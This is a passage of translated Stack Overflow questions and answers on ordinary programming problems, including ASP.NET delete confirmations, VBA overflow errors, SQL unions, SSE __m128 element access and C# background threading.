**编辑：**还尝试添加一个 **类**（用于使用 jquery 处理它）但没有成功

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:06:44.207

请注意，它没有[在其 members 中声明](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.hyperlinkfield.aspx)`OnClientClick`事件。

尝试`NavigateUrl`像这样设置属性：

```
NavigateUrl='<%# "javascript:return confirm('Are you sure you would like to delete the selected landing page?')" %>' 
```

## 更新

也尝试设置`DataNavigateUrlFormatString`这样的：

```
DataNavigateUrlFormatString="{0}" 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-27T15:22:21.710

您可以使用 `<asp:Button/>`,`<asp:LinkButton/>`或`<asp:ImageButton/>`来处理客户端和服务器端的点击事件。

```
<asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False">
    <Columns>
       <!--- Other columns/Fields -->
        <asp:TemplateField>
            <ItemTemplate>
                <asp:LinkButton 
                    ID="LinkButton1" 
                    runat="server" 
                    OnClientClick='return confirm("Are you sure to delete a record?")'
                    CommandName="Delete">Delete</asp:LinkButton>
            </ItemTemplate>
        </asp:TemplateField>
    </Columns>
</asp:GridView> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:25:10.013

在我的项目中，我确实喜欢这样，我显示一个 div 进行确认，如下所示

```
<div id="dvDeleteCategory" title="Delete Category">
    <h5>
        Are you sure you wont to delete this category !!!</h5>
</div>

<script type="text/javascript">
    $(function () {       
        $(".lnkDelete").button();
        $("#dvDeleteCategory").dialog({
            autoOpen: false,
            width: 400,
            modal: true,
            resizable: false,
            height: 250
        });

        $(".lnkDelete").click(function (e) {
            e.preventDefault();
            var trargeturl = $(this).attr('href');
            $("#dvDeleteCategory").dialog({
                buttons: {
                    "Delete": function () {
                        window.location.href = trargeturl;
                    },
                    "Cancle": function () {
                        $(this).dialog('close');
                    }
                }
            });
            $("#dvDeleteCategory").dialog('open');
        });
    });
</script> 
```

我想这会帮助你..

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-27T16:36:14.170

使用模板字段解决了我的问题；）

```
<asp:TemplateField HeaderText="Delete" ShowHeader="False">
  <ItemTemplate>
     <a onclick="return confirm('Are you sure to delete a record?')" href="ViewLandingPages.aspx?delete=yes&id=<%# Eval("id") %>">Delete</a>
   </ItemTemplate>
</asp:TemplateField> 
```

# delphi - 如何在 DrawCell 上修改数据库字段的文本？TcxGrid

> ID：12624448
> 
> 赞同：0
> 
> 时间：2012-09-27T15:05:09.553
> 
> 标签：delphi, devexpress, delphi-xe, tcxgrid

以前使用默认 DBGrid，我可以更改单元格的值，而无需使用以下代码更改数据库中的数据。

```
procedure TEMRForm.DBGridCDrawColumnCell(Sender: TObject; const Rect: TRect;
DataCol: Integer; Column: TColumn; State: TGridDrawState);
begin
  if Column.FieldName = 'START_DATE' then
  begin
    DBGridC.Canvas.FillRect(Rect);          
    DBGridC.Canvas.TextOut(Rect.Left+2,Rect.Top+2,Column.Field.Text + ' *');
  end;
end; 
```

效果很好，但是我在 cxgrid 上实现这种相同的功能时遇到了麻烦。这是我当前的代码，它没有显示单元格值被更改的迹象。

```
procedure TEMRForm.cxGridCDBTableView1CustomDrawCell(
Sender: TcxCustomGridTableView; ACanvas: TcxCanvas;
AViewInfo: TcxGridTableDataCellViewInfo; var ADone: Boolean);
var
ARect: Trect;
begin
  ARect := AViewInfo.Bounds;
  if AViewInfo.Item.Caption = 'Start Date' then
  begin
    ACanvas.FillRect(ARect);
    ACanvas.TextOut(ARect.Left+2,ARect.Top+2,TableC.FieldByName('START_DATE').AsString+' *');
  end;
end; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T18:31:42.673

我认为您看不到绘制完成的`cxGridCDBTableView1CustomDrawCell()`原因是因为您没有将`ADone`参数设置为`true`- 因此默认绘画将“取消”（过度绘制）您的。

但是，我认为实现你所追求的正确方法是使用列的事件`OnGetDisplayText`和`OnGetContentStyle`（后面的事件是样式的子属性，即`Column.Styles.OnGetContentStyle`）。

# android - Android 获取 Twitter 关注者列表？

> ID：12624449
> 
> 赞同：0
> 
> 时间：2012-09-27T15:05:13.000
> 
> 标签：android, twitter

我正在尝试获取 twitter 朋友列表。为此，请参考以下网址。从那我得到了朋友组的ID。如何获取每个 id 的详细信息。请给我建议。

谢谢拉杰什K

[https://dev.twitter.com/docs/api/1/get/friends/ids](https://dev.twitter.com/docs/api/1/get/friends/ids)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-06T14:40:08.173

您可以使用此代码：-

```
TwitterCursorList<TwitterUser> friendsList = service.ListFriends(new ListFriendsOptions{ Cursor = -1 });

while (friendsList.NextCursor != 0)
{
 friendsList = service.ListFriends(new ListFriendsOptions
 {
  Cursor = friendsList.NextCursor
 });

} 
```

上面的代码会给你所有的推特朋友。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:36:26.017

参考
[https://dev.twitter.com/docs/api/1.1/get/friendships/lookup](https://dev.twitter.com/docs/api/1.1/get/friendships/lookup)

此外，不推荐使用 Twitter API 版本 1。您应该使用 1.1 版。

# excel - 以下 Excel 2010 VBA 出现溢出错误 6

> ID：12624454
> 
> 赞同：3
> 
> 时间：2012-09-27T15:05:27.890
> 
> 标签：excel, vba

以下代码将按照我想要的方式正确格式化我的模板。但是，如果模板为空并且用户点击工作表上的准备上传按钮，我将收到溢出错误 6。有没有办法消除导致此错误的原因？

```
 Sub PrepForUpload()

Dim cel As Range, rng As Range

Set rng = Range("A2", Range("A65536").End(xlUp))

For Each cel In rng

    If cel.Value = "" Then

        If cel.Offset(, 2).Value = "" Then
            cel.EntireRow.Delete

        End If

    End If

    Next cel

Dim rowNumber As Integer
With Sheets("Initiatives")

If Len(.Cells(2, 1)) = 0 Then

rowNumber = .Cells(2, 1).End(xlDown).End(xlDown).Row + 1

Else: rowNumber = .Cells(2, 1).End(xlDown).Row + 1

End If

.Rows(rowNumber & ":" & .Rows.Count).Clear

End With

End Sub 
```

调试指向以下行作为问题：

```
rowNumber = .Cells(2, 1).End(xlDown).End(xlDown).Row + 1 
```

谢谢

瑞安

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-27T15:13:57.530

你得到一个溢出，因为`Integer`在 VBA 中是一个 16 位有符号数（最大值为 32767）。无论 excel 的版本如何，您至少有 65535 行，如果您使用 XLSX 文件格式，则可能更多。您需要更改`rowNumber`为`Long`

而且您还必须围绕空白工作表场景编写代码。当您调用此行时：

```
rowNumber = .Cells(2, 1).End(xlDown).End(xlDown).Row + 1 
```

并且工作表为空白，`.End(xlDown)`将返回工作表中可能的最后一行，在 Excel 2010（和 Excel 2007）的情况下为 1048576。一旦更改`rowNumber`为 a `Long`，您将不再收到溢出错误，但您会遇到这条线的一个问题：

```
.Rows(rowNumber & ":" & .Rows.Count).Clear 
```

这是因为您试图选择一个不存在的范围（第 1048577 行）（因此类型不匹配）。您需要添加一行代码来解决这种情况。最初检查空白工作表，或检查行 > 1048576。

最简单的做法是添加一行来检查：

```
If rowNumber <= 1048576 Then
    .Rows(rowNumber & ":" & .Rows.Count).Clear
End If 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:32:11.267

更改`rowNumber`为`Long`然后添加`1&`或使用`CLng`以消除“类型不匹配”错误。

```
rowNumber = CLng(.Cells(2, 1).End(xlDown).End(xlDown).Row + 1) 
```

或者

```
rowNumber = .Cells(2, 1).End(xlDown).End(xlDown).Row + 1& 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T16:10:39.510

您能告诉我们您的数据在 A 列中的样子吗？您也可以尝试此代码，该代码在尝试获取行号之前测试行数

```
Dim cel As Range, rng As Range

If Application.WorksheetFunction.CountA(Columns(1)) <= 1 Then
    MsgBox "No lines"
    Exit Sub
End If

Set rng = Range("A2", Cells(Rows.Count, 1).End(xlUp))

For Each cel In rng

    If Len(cel.Value) = 0 Then

        If Len(cel.Offset(, 2).Value) = 0 Then cel.EntireRow.Delete

    End If

Next cel

Dim rowNumber As Long

With Sheets("Initiatives")

    If Application.WorksheetFunction.CountA(.Columns(1)) <= 1 Then
        MsgBox "No lines in sheet Initiative"
        Exit Sub
    End If

If Len(.Cells(2, 1)) = 0 Then

    rowNumber = .Cells(2, 1).End(xlDown).End(xlDown).Row + 1

    Else: rowNumber = .Cells(2, 1).End(xlDown).Row + 1

End If

.Rows(rowNumber & ":" & .Rows.Count).Clear

End With 
```

# c - 是否可以将变量从一个进程传递到另一个进程？

> ID：12624455
> 
> 赞同：3
> 
> 时间：2012-09-27T15:05:27.580
> 
> 标签：c

假设我有 2 个进程，并且我有一个变量要从第一个传递到第二个。我知道我可以声明一个全局变量并在不同的函数之间通过引用传递它，但我不知道是否可以在不同的进程之间传递一个变量。

我听说每个进程都分配了自己的虚拟内存部分，并且一个进程无法访问另一个进程的内存空间。这是真的吗？或者两个进程实际上可以共享一个变量，因此需要互斥机制？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-27T15:06:50.167

> 我不知道是否可以在不同进程之间传递变量。

不，这是不可能的，至少在传递变量的经典意义上是不可能的。但是，您有很多选择：进程间通信可以通过共享内存（有时通过内存映射文件实现）、命名管道等来完成。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-27T15:06:27.503

> 或者两个进程实际上可以共享一个变量，因此需要互斥机制？

是的，您应该查找共享内存，或者更一般地说，IPC / 进程间通信。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-27T15:10:31.213

如果第二个进程是从第一个进程开始的，则可以将其作为命令行参数传递。

否则你应该依赖一些进程间通信方法（如 Socket 或 FIFO，也称为命名管道）。

你可以看看这个其他帖子：

[通过文件进行进程间通信](https://stackoverflow.com/questions/11062444/interprocess-communication-via-file/11062480#11062480)

# android - 我可以以编程方式禁用recentappbutton android 4.0吗？

> ID：12624456
> 
> 赞同：1
> 
> 时间：2012-09-27T15:05:33.180
> 
> 标签：android

我正在开发一个项目，我需要禁用最近的应用程序按钮。

谁能知道这是否可能？如果我能做到，我该怎么做？

谢谢。

# sql - 选择 Query 通过连接两个表来生成和排除一些结果

> ID：12624457
> 
> 赞同：0
> 
> 时间：2012-09-27T15:05:36.563
> 
> 标签：sql, select, oracle10g

我有两个名为 config 和 config_exceptions 的表。两者具有相同的结构。列是 home、configName、data、active。

配置表有以下数据

```
0 config1 my_data1 active
0 config1 my_data2 active
0 config1 my_data3 active
0 config2 my_data3 active
2 config1 my_data1 active
2 config2 my_data1 active 
```

config_exceptions 表有以下数据

```
10 config1 my_data1 active 
```

我需要编写一个查询以仅使用 home 0 来排除 config_exceptions 数据以给出结果，如下所示

```
0 config1 my_data1 active
0 config1 my_data2 active
0 config1 my_data3 active
0 config2 my_data3 active
2 config1 my_data1 active
2 config2 my_data1 active
10 config1 my_data2 active
10 config1 my_data3 active 
```

此结果是使用 home 0 为 home 10 创建一组新的配置结果，并排除 config_exceptions 表数据。**比较的主要列是 home 和 configName。**

而且我不能硬编码为 10，它们会更多，但是 0 可以硬编码，因为它用作基础。

请帮我写这个查询，我不知道。请给我一些想法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:18:17.240

好吧，使用您的样本，这确实有效。

```
SELECT home, configName, data, active
FROM config

UNION

SELECT ce.home, c.configName, c.data, c.active
FROM config_exceptions ce
INNER JOIN config c ON c.configName = ce.configName
WHERE ce.data <> c.data
AND c.home = 0 
```

[SqlFiddle](http://sqlfiddle.com/#!4/c1a3f/5)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:17:59.487

我认为是这样的：

```
select *
from ((select home, configName, data, active
       from config
      ) union all
      (select 10 as home, configName, data, active
       from config c left outer join
            config_exceptions ce
            on c.home = ce.home and
               c.configName= ce.configName and
               c.active = ce.active
       where config = 0 and
             ce.home is null
      )
     )
order by 1, 2, 3, 4 
```

# objective-c - 如何定义我的字符串和编码类型。NSString -NSS 数据

> ID：12624459
> 
> 赞同：2
> 
> 时间：2012-09-27T15:05:37.937
> 
> 标签：objective-c, nsstring, nsdata, http-request

我正在尝试将具有 2 个值的字符串发布到 URL。要定义我正在使用的字符串：

```
NSString *post = [NSString stringWithFormat:@"...."];
NSData *postData = [post dataUsingEncoding: .... allowLossyConversion: NO]; 
```

我要发布的字符串是这个：`geoX#value #geoY#value`。
如何在我的 NSString 命令中添加这个字符串以及我应该使用什么类型的 dataUsingEncoding？

同样在命令：

```
[request setValue:@"....." forHTTPHeaderField:"...."] 
```

如果 header --> content-type :text/html，我要添加什么值以及什么类型的内容？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-09T06:58:06.907

假设您将值存储在两个变量中，如下所示，

```
NSString *geoXValue = @"1.2343243";
NSString *geoYValue = @"1.5646546"; 
```

这就是您需要将值附加到字符串的方式，

```
NSString *post = [NSString stringWithFormat:@"geoX%@ geoY%@", geoXValue, geoYValue]; 
```

要将其转换为数据，您可以使用以下行，

```
NSData *postData = [post dataUsingEncoding:NSUTF8StringEncoding allowLossyConversion:NO]; 
```

并在标题中设置内容类型，试试这个，

```
[request setValue:@"text/html" forHTTPHeaderField:"Content-Type"] 
```

希望现在很清楚。

# html - 是否有任何技术可以指示是否“使用”了 html 选择元素？

> ID：12624460
> 
> 赞同：0
> 
> 时间：2012-09-27T15:05:42.633
> 
> 标签：html, html-select

想象一下，我有一些带有许多不同过滤器的 web 应用程序，这些过滤器会影响例如页面上的搜索结果。

过滤器是可选的，我使用选择元素。第一个选项始终意味着过滤器未使用，并表示“未使用”或“选择 xyz”。

我现在正在寻找一种方法，可以快速查看当前使用哪些过滤器，哪些未使用，例如通过更改颜色或背景颜色。

我还没有找到通过 CSS 做到这一点的方法，也许没有 javascript 是不可能的？解决方案只需要在最新的 Chrome 中运行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:18:40.470

如果您希望下拉菜单的颜色在用户更改选择后立即更改（无需重新加载页面），则必须使用 JavaScript。就像是：

```
<script type="text/Javascript">
    function changeColor(element)
    {
        if (element.selectedIndex != 0)
            element.style.backgroundColor = "green";
        else
            element.style.backgroundColor = "red";
    }
</script>

<select onchange="changeColor(this)"> 
```

这就是用户更改选择后立即更改颜色的方式。

要在页面重新加载时更改它，您必须使用一些服务器端脚本语言（我假设您已经在使用）。因此，在创建`<select>`元素时，您将检查其值是否已设置。如果您使用的是 PHP，它可能看起来像这样：

```
<select name="mySelect" style="background-color:<?php echo ($_POST["mySelect"] == "select xyz" ? "red" : "green"); ?>;"> 
```

# c++ - 通过索引获取 __m128 的成员？

> ID：12624466
> 
> 赞同：26
> 
> 时间：2012-09-27T15:06:06.887
> 
> 标签：c++, clang, sse, simd, intrinsics

我有一些代码，最初是由与 MSVC 合作的人给我的，我正试图让它在 Clang 上工作。这是我遇到问题的功能：

```
float vectorGetByIndex( __m128 V, unsigned int i )
{
    assert( i <= 3 );
    return V.m128_f32[i];
} 
```

我得到的错误如下：

```
Member reference has base type '__m128' is not a structure or union. 
```

我环顾四周，发现 Clang（也许还有 GCC）在将 __m128 视为结构或联合时存在问题。但是，我还没有找到关于如何取回这些值的直接答案。我试过使用下标运算符但做不到，我浏览了大量的 SSE 内在函数列表，但还没有找到合适的。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-09-27T16:46:43.717

作为对 hirschhornsalz 解决方案的修改，如果`i`是编译时常量，您可以通过使用 shuffle 完全避免联合路径：

```
template<unsigned i>
float vectorGetByIndex( __m128 V)
{
    // shuffle V so that the element that you want is moved to the least-
    // significant element of the vector (V[0])
    V = _mm_shuffle_ps(V, V, _MM_SHUFFLE(i, i, i, i));
    // return the value in V[0]
    return _mm_cvtss_f32(V);
} 
```

标量浮点数*只是*XMM 寄存器的底部元素，高元素允许非零；`_mm_cvtss_f32`是免费的，将编译为零指令。这将作为一个 shufps 内联（或者对于 i==0 什么都没有）。

编译器足够聪明，可以优化掉 shuffle `i==0`（长期过时的 ICC13 除外），因此不需要`if (i)`. [https://godbolt.org/z/K154Pe](https://godbolt.org/z/K154Pe)。clang 的 shuffle 优化器将编译`vectorGetByIndex<2>`成`movhlps xmm0, xmm0`比它短 1 个字节`shufps`并产生相同的低元素。`switch`您可以使用/`case`为其他编译器手动执行此操作，因为`i`它是编译时常量，但是在手动矢量化时使用它的少数地方的 1 字节代码大小非常简单。

* * *

请注意，SSE4.1`_mm_extract_epi32(V, i);`在这里不是一个有用的 shuffle：`extractps r/m32, xmm, imm`只能将 FP 位模式提取到*整数*寄存器或内存（[https://www.felixcloutier.com/x86/extractps](https://www.felixcloutier.com/x86/extractps)）。（并且内在函数将其返回为`int`，因此它实际上会编译为`extractps`+`cvtsi2ss`以在 FP 位模式上进行 int->float 转换，除非您在 C++ 代码中对它进行类型双关。但是您希望它能够编译to `extractps eax, xmm0, i`/`movd xmm0, eax`这与 shufps 相比很糟糕。）

唯一`extractps`有用的情况是编译器希望将此结果直接存储到内存中，并将存储折叠到提取指令中。（对于 i!=0，否则它将使用`movss`）。将结果作为标量浮点数保留在 XMM 寄存器中`shufps`是很好的。

（[SSE4.1`insertps`](https://www.felixcloutier.com/x86/insertps)可以使用但没必要：它可以在获取任意源元素的同时将其他元素归零。）

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2012-09-27T15:16:17.483

联合可能是最便携的方法：

```
union {
    __m128 v;    // SSE 4 x float vector
    float a[4];  // scalar array of 4 floats
} U;

float vectorGetByIndex(__m128 V, unsigned int i)
{
    U u;

    assert(i <= 3);
    u.v = V;
    return u.a[i];
} 
```

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2012-09-27T15:47:12.380

利用

```
template<unsigned i>
float vectorGetByIndex( __m128 V) {
    union {
        __m128 v;    
        float a[4];  
    } converter;
    converter.v = V;
    return converter.a[i];
} 
```

无论可用的指令集如何，这都将起作用。

注意：即使 SSE4.1 可用并且`i`是编译时间常数，**也不能这样**使用`pextract`etc.，因为这些指令提取的是 32 位整数，而不是`float`:

```
// broken code starts here
template<unsigned i>
float vectorGetByIndex( __m128 V) {
    return _mm_extract_epi32(V, i);
}
// broken code ends here 
```

我不删除它，因为它是一个有用的提醒如何不做的事情。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-07-10T04:16:33.093

我使用的方式是

```
union vec { __m128 sse, float f[4] };

float accessmember(__m128 v, int index)
{
    vec v.sse = v;
    return v.f[index];
} 
```

似乎对我来说效果很好。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-01-07T21:19:51.880

迟到了，但发现这在 MSVC 中对我有用，其中 z 是 __m128 类型的变量。

```
#define _mm_extract_f32(v, i)       _mm_cvtss_f32(_mm_shuffle_ps(v, v, i))

__m128 z = _mm_setr_ps(1.0, 2.0, 3.0, 4.0);

float f = _mm_extract_f32(z, 2); 
```

或者更简单

```
__m128 z;

float f = z.m128_f32[2];  // to get the 3rd float value in the vector 
```

# iphone - MonoTouch 中的线程与 webrequest 和 uialertview

> ID：12624470
> 
> 赞同：1
> 
> 时间：2012-09-27T15:06:16.093
> 
> 标签：iphone, ios, multithreading, xamarin.ios, monodevelop

我访问一个网站并使用它检索一些数据，`HttpWebRequest`并且在检索所述数据时我需要一个`UIAlertView`带有 a`UIActivityIndicatorView`的显示。但是，它只会使屏幕变暗，直到为时已晚才显示警报。我在这里阅读了其他与线程相关的问题，但不知道如何解决这个问题。我尝试使用 ThreadPool、InvokeOnMainThread、Tasks，所有这些都不起作用。

编辑：

```
HttpWebRequest url = (HttpWebRequest)WebRequest.Create ("maps.googleapis.com/maps/api/place/search/..); 

HttpWebResponse webResp = (HttpWebResponse)url.GetResponse (); JsonValue jVal = 

JsonObject.Load (webResp.GetResponseStream ()); 

JsonObject jObj = (JsonObject)jVal; 
```

我有上面的代码，如果它可以为我正确格式化，我将如何将其转换为使用 WebClient？你还能从中得到 JSON 之类的东西吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T17:19:45.120

`WebClient`它通常`*Async`比使用`HttpWebRequest`.

这是一个下载并显示小图像的示例。

```
WebClient client = new WebClient ();
var wait = new UIActivityIndicatorView (View.Bounds);
client.DownloadDataCompleted += (object sender, DownloadDataCompletedEventArgs e) => {
    byte[] result = e.Result;
    if (result != null) {
        NSData data = NSData.FromArray (e.Result);
        UIImage img = UIImage.LoadFromData (data);
        InvokeOnMainThread (delegate {
            ShowImage (img);
            wait.StopAnimating ();
        });
    }
};
wait.StartAnimating ();
client.DownloadDataAsync (new Uri (url)); 
```

**编辑（更新问题）**

对于您可以使用[`WebClient.OpenReadAsync`](http://msdn.microsoft.com/en-US/library/ms144211%28v=vs.80%29.aspx)的流和[`OpenReadCompleted`](http://msdn.microsoft.com/en-US/library/system.net.webclient.openreadcompleted%28v=vs.80%29.aspx)事件。

# android - Android中的主动wifi监视器

> ID：12624471
> 
> 赞同：3
> 
> 时间：2012-09-27T15:06:18.810
> 
> 标签：android, wifi, wifimanager

我正在开发一个应连接到网络并监控信号强度的 Android 应用程序。我已经做到了连接和看到力量，但我不知道如何积极地“听到”和展示力量。这是我的监控方法：

```
public void search(View v) {

        // Turn on wifi
        if (!wifi.isWifiEnabled()) {
            if (wifi.getWifiState() != WifiManager.WIFI_STATE_ENABLING) {
                wifi.setWifiEnabled(true);
            }
        }

        // Register the desired network
        int nId = wifi.addNetwork(netConfig);

        // create the BroadcastReciever
        if (wifiReciever == null) {
            wifiReciever = new BroadcastReceiver() {

                @Override
                public void onReceive(Context context, Intent intent) {
                    final String action = intent.getAction();
                    if (action
                            .equals(WifiManager.SUPPLICANT_CONNECTION_CHANGE_ACTION)) {
                        if (intent.getBooleanExtra(
                                WifiManager.EXTRA_SUPPLICANT_CONNECTED, false)) {
                            message.setText("Connected: "
                                    + wifi.getConnectionInfo().getRssi());
                        } else {
                            message.setText("Disconnected...");
                        }
                    } else if (action.equals(WifiManager.RSSI_CHANGED_ACTION)) {
                        message.setText("Connected: "
                                + wifi.getConnectionInfo().getRssi());
                    }
                }
            };
        }
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(WifiManager.SUPPLICANT_CONNECTION_CHANGE_ACTION);
        intentFilter.addAction(WifiManager.RSSI_CHANGED_ACTION);
        registerReceiver(wifiReciever, intentFilter);

        // intentamos conectarnos
        wifi.enableNetwork(nId, true);

    } 
```

此代码有时有效，但不会经常更新强度。是否有 API 或任何其他方法/隐藏的 API 来做我想做的事？

任何帮助都会很棒！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-01T21:17:51.013

Wifi 信号强度（如当前网络活动或 CPU 使用率）不是一个无需轮询传感器即可监听的量。其他 wifi 监控应用程序只是按用户定义的时间间隔进行轮询。wifi 信号测量中存在大量噪声和波动，因此您不能坐等它发生变化。据我所知，该意图仅在信号强度发生重大变化时才会广播，因此不适合现场监视器。

# jquery - 如何从 Twitter Bootstrap 表中删除背景 tr 颜色？

> ID：12624472
> 
> 赞同：1
> 
> 时间：2012-09-27T15:06:25.790
> 
> 标签：jquery, css, twitter-bootstrap

我正在使用[Twitter Bootstrap](http://twitter.github.com/bootstrap/) v 2.0.1，并为我的表提供了 table-striped 类。如果单击，我正在尝试更改行颜色。除了没有条纹颜色的每个 n:th 行之外，这很有效。我假设我需要先删除条纹颜色，但我的尝试失败了。知道我错过了什么吗？

HTML

```
<table class="table table-bordered table-condensed table-striped">
        <thead>
            <tr>
                <th>Col 1</th>
                <th>Col 2</th>
                <th>Col 3</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td><strong>Data 1</strong></td>
                <td>Data 2</td>
                <td>Data 3</td>
            </tr>
            <tr>
                <td><strong>Data 1</strong></td>
                <td>Data 2</td>
                <td>Data 3</td>
            </tr>
            <tr>
                <td><strong>Data 1</strong></td>
                <td>Data 2</td>
                <td>Data 3</td>
            </tr>
        </tbody>
    </table> 
```

我的 jQuery 尝试：

```
<script type="text/javascript">

$(document).ready(function(){

    $('tr').click( function() {
        $(this).siblings().removeClass('table-striped');
        //$(this).css('background-color', '#ff0000').siblings().removeClass('table-striped');
     });
});

</script> 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:10:18.047

好吧，既然它们是通过使用创建的：`tr:nth-child(odd) td`，我们不能简单地“删除”类**table-striped**，因为它会影响整个表。

创建自己的类让我们说：`.highlightBG { background:#5279a4; }`

而是这样做：

```
$('table.table-striped tr').on('click', function () {
    $(this).find('td').addClass('highlightBG');
    // potentially even .toggleClass('highlightBG'); to alternate it
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:13:27.027

table-striped is a class on the table, not the `<tr>` or siblings, so either create a new class to toggle on `<tr>` or jQuery `parents('table')` or change `$(this)` to `$('table.table')`

In the end I think you want to keep the striping on all the other rows, and change the current selected, if that is the case then use the first suggestion and override with a new css class on `$(this)` Don't remove table-striped and make sure your new class has a higher specificity.

# c# - Run task asynchronously in C#

> ID：12624474
> 
> 赞同：0
> 
> 时间：2012-09-27T15:06:29.747
> 
> 标签：c#, winforms, multithreading

I have some process heavy tasks that run in my WinForms app. The problem is, while its running, it freeze the UI (UI main thread).

I haven't worked that much with threads and delegates in C# yet, and that's why I hope someone could help me to, how to handle those process heavy tasks, without freezing the UI, so the user don't think the app is crashing while waiting?

Eg. I have a call through my `FrontController`, that takes time:

```
_controller.testExportExcel(wrapper, saveDialog.FileName); 
```

Since it's creating an Excel file. I won't the app to be responding on the UI while its working.

Another example of a process heavy task could be this:

```
private void dataGridView_liste_DataBindingComplete(object sender, DataGridViewBindingCompleteEventArgs e)
{
  if (e.ListChangedType != ListChangedType.ItemDeleted)
  {
     foreach (DataGridViewRow r in dataGridView_liste.Rows)
     {
       DataGridViewCellStyle red = dataGridView_liste.DefaultCellStyle.Clone();
       red.BackColor = Color.LightGreen;
       if (r.Cells["News"].Value != null && (bool)r.Cells["News"].Value == true)
         r.DefaultCellStyle = red;
     }
  }
} 
```

Where the `foreach` loop takes time, and freeze the UI. An async thread running the process and automatically closing when its done, could be useful I think. But how does it work??

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T15:15:41.503

如何使用[任务](http://msdn.microsoft.com/en-us/library/dd321439.aspx)（如果针对 .net 4）？这被认为是 BackgroundWorker 类的替代品，因为它支持嵌套（父/子任务）、任务延续等。

例如

```
 private void dataGridView_liste_DataBindingComplete(object sender,
      DataGridViewBindingCompleteEventArgs e)  
    {
        Task t = Task.Factory.StartNew(() =>
        {
            // do your processing here - remember to call Invoke or BeginInvoke if
            // calling a UI object.
        });
        t.ContinueWith((Success) =>
        {
            // callback when task is complete.
        }, TaskContinuationOptions.NotOnFaulted);
        t.ContinueWith((Fail) =>
        {
            //log the exception i.e.: Fail.Exception.InnerException);
        }, TaskContinuationOptions.OnlyOnFaulted);

    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-27T15:10:50.980

[我在这里](https://stackoverflow.com/questions/7888707/asynchronous-execution-in-windows-forms/7888743#7888743)回答了一个非常相似的问题

归结为使用 BackgroundWorker。

[msdn](http://msdn.microsoft.com/en-us/library/cc221403%28v=vs.95%29.aspx)提供了一个示例：

```
using System.ComponentModel;
using System.Windows;
using System.Windows.Controls;

namespace SL_BackgroundWorker_CS
{
    public partial class Page : UserControl
    {
        private BackgroundWorker bw = new BackgroundWorker();

        public Page()
        {
            InitializeComponent();

            bw.WorkerReportsProgress = true;
            bw.WorkerSupportsCancellation = true;
            bw.DoWork += new DoWorkEventHandler(bw_DoWork);
            bw.ProgressChanged += new ProgressChangedEventHandler(bw_ProgressChanged);
            bw.RunWorkerCompleted += new RunWorkerCompletedEventHandler(bw_RunWorkerCompleted);
        }
        private void buttonStart_Click(object sender, RoutedEventArgs e)
        {
            if (bw.IsBusy != true)
            {
                bw.RunWorkerAsync();
            }
        }
        private void buttonCancel_Click(object sender, RoutedEventArgs e)
        {
            if (bw.WorkerSupportsCancellation == true)
            {
                bw.CancelAsync();
            }
        }
        private void bw_DoWork(object sender, DoWorkEventArgs e)
        {
            BackgroundWorker worker = sender as BackgroundWorker;

            for (int i = 1; (i <= 10); i++)
            {
                if ((worker.CancellationPending == true))
                {
                    e.Cancel = true;
                    break;
                }
                else
                {
                    // Perform a time consuming operation and report progress.
                    System.Threading.Thread.Sleep(500);
                    worker.ReportProgress((i * 10));
                }
            }
        }
        private void bw_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            if ((e.Cancelled == true))
            {
                this.tbProgress.Text = "Canceled!";
            }

            else if (!(e.Error == null))
            {
                this.tbProgress.Text = ("Error: " + e.Error.Message);
            }

            else
            {
                this.tbProgress.Text = "Done!";
            }
        }
        private void bw_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            this.tbProgress.Text = (e.ProgressPercentage.ToString() + "%");
        }
    }
} 
```

在 DoWork 事件处理程序中运行的所有内容都是异步的。
在 ProgessChanged/RunWorkCompleted 的事件处理程序中运行的所有内容都在 UI 线程上。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:32:14.813

对于您的第一个示例，调用`_controller.testExportExcel()`、 a`BackgroundWorker`或`Task Parallel Library`调用（即`Task.Factory.StartNew(...)`）将适合满足您保持 UI 响应的要求。周围有很多例子，包括这里的其他答案。

对于第二个示例，您会发现不能将其放在后台线程上，因为它似乎是操纵 UI 的代码。具体来说，如果你`BackgroundWorker`的`DoWork`事件处理程序的实现，或者你传递给的委托`Task.Factory.StartNew()`，或者一个普通的旧线程的方法接触到 UI，你很可能（/确定？）得到一个异常，说明“跨线程操作无效”。

